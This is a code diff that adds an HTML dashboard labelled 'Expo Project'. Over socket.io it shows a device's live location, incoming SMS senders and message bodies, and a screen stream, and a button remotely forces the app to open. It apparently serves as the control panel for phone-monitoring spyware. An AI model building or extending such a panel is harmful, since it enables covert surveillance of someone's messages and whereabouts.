@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Expo Project Dashboard</title>
+    <script src="/socket.io/socket.io.js"></script>
+</head>
+<body>
+    <h1>Expo Project - Real-time Data</h1>
+    <div id="data">
+        <h2>Location:</h2>
+        <p id="location">Waiting for data...</p>
+        <h2>SMS:</h2>
+        <p id="sms">Waiting for data...</p>
+        <h2>Screen:</h2>
+        <p id="screen">Waiting for data...</p>
+    </div>
+    <button id="forceOpen">Force Open App</button>
+
+    <script>
+        const socket = io();
+
+        socket.on('update', (data) => {
+            if (data.type === 'location') {
+                document.getElementById('location').textContent = `Lat: ${data.lat}, Lng: ${data.lng}`;
+            } else if (data.type === 'sms') {
+                document.getElementById('sms').textContent = `From: ${data.sender}, Body: ${data.body}`;
+            } else if (data.type === 'screen') {
+                document.getElementById('screen').textContent = data.stream; // Placeholder
+            }
+        });
+
+        document.getElementById('forceOpen').addEventListener('click', () => {
+            socket.emit('force_open');
+        });
+    </script>
+</body>
+</html>
